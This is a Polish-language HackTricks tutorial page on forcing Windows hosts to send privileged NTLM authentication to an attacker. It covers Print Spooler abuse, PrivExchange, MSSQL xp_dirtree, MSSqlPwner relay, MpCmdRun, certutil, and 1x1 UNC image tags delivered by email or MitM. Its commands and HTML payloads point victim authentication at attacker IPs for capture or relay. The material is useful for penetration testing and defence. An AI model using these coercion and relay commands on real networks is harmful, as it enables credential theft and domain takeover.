# Wymuszenie uprzywilejowanej autoryzacji NTLM

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na GitHubie.

</details>
{% endhint %}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) to **zbiór** **wyzwalaczy zdalnej autoryzacji** napisanych w C# przy użyciu kompilatora MIDL, aby uniknąć zależności od stron trzecich.

## Nadużycie usługi Spooler

Jeśli usługa _**Print Spooler**_ jest **włączona**, możesz użyć niektórych już znanych poświadczeń AD, aby **zażądać** od serwera drukarek kontrolera domeny **aktualizacji** dotyczącej nowych zadań drukowania i po prostu powiedzieć mu, aby **wysłał powiadomienie do jakiegoś systemu**.\
Zauważ, że gdy drukarka wysyła powiadomienie do dowolnych systemów, musi **uwierzytelnić się** w tym **systemie**. Dlatego atakujący może sprawić, że usługa _**Print Spooler**_ uwierzytelni się w dowolnym systemie, a usługa **użyje konta komputera** w tej autoryzacji.

### Znajdowanie serwerów Windows w domenie

Używając PowerShell, uzyskaj listę komputerów z systemem Windows. Serwery są zazwyczaj priorytetowe, więc skupmy się na nich:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Finding Spooler services listening

Używając nieco zmodyfikowanego @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), sprawdź, czy usługa Spooler nasłuchuje:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Możesz również użyć rpcdump.py na Linuxie i szukać protokołu MS-RPRN.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Poproś usługę o uwierzytelnienie przeciwko dowolnemu hoście

Możesz skompilować[ **SpoolSample stąd**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
lub użyj [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) lub [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), jeśli jesteś na Linuxie
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Łączenie z Nieograniczoną Delegacją

Jeśli atakujący już skompromitował komputer z [Nieograniczoną Delegacją](unconstrained-delegation.md), atakujący mógłby **sprawić, że drukarka uwierzytelni się w tym komputerze**. Z powodu nieograniczonej delegacji, **TGT** **konta komputera drukarki** będzie **zapisane w** **pamięci** komputera z nieograniczoną delegacją. Ponieważ atakujący już skompromitował ten host, będzie w stanie **odzyskać ten bilet** i go wykorzystać ([Pass the Ticket](pass-the-ticket.md)).

## Wymuszenie uwierzytelnienia RCP

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

Atak `PrivExchange` jest wynikiem luki znalezionej w **funkcji `PushSubscription` serwera Exchange**. Ta funkcja pozwala serwerowi Exchange na wymuszenie przez dowolnego użytkownika domeny z skrzynką pocztową uwierzytelnienia do dowolnego hosta dostarczonego przez klienta za pośrednictwem HTTP.

Domyślnie **usługa Exchange działa jako SYSTEM** i ma nadmierne uprawnienia (konkretnie, ma **uprawnienia WriteDacl na domenie przed aktualizacją zbiorczą 2019**). Ta luka może być wykorzystana do umożliwienia **przekazywania informacji do LDAP i następnie wydobycia bazy danych NTDS domeny**. W przypadkach, gdy przekazywanie do LDAP nie jest możliwe, ta luka może być nadal używana do przekazywania i uwierzytelniania do innych hostów w obrębie domeny. Udane wykorzystanie tego ataku zapewnia natychmiastowy dostęp do administratora domeny z dowolnym uwierzytelnionym kontem użytkownika domeny.

## Wewnątrz Windows

Jeśli już jesteś wewnątrz maszyny Windows, możesz wymusić Windows na połączenie z serwerem przy użyciu uprzywilejowanych kont za pomocą:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Lub użyj tej innej techniki: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Możliwe jest użycie certutil.exe lolbin (podpisany przez Microsoft) do wymuszenia uwierzytelniania NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

If you know the **email address** of the user that logs inside a machine you want to compromise, you could just send him an **email with a 1x1 image** such as
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
i gdy to otworzy, spróbuje się uwierzytelnić.

### MitM

Jeśli możesz przeprowadzić atak MitM na komputer i wstrzyknąć HTML na stronie, którą będzie wizualizował, możesz spróbować wstrzyknąć obrazek taki jak poniżej na stronie:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Łamanie NTLMv1

Jeśli możesz przechwycić [wyzwania NTLMv1, przeczytaj, jak je złamać](../ntlm/#ntlmv1-attack).\
&#xNAN;_&#x52;emember, że aby złamać NTLMv1, musisz ustawić wyzwanie Respondera na "1122334455667788"_

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.

</details>
{% endhint %}
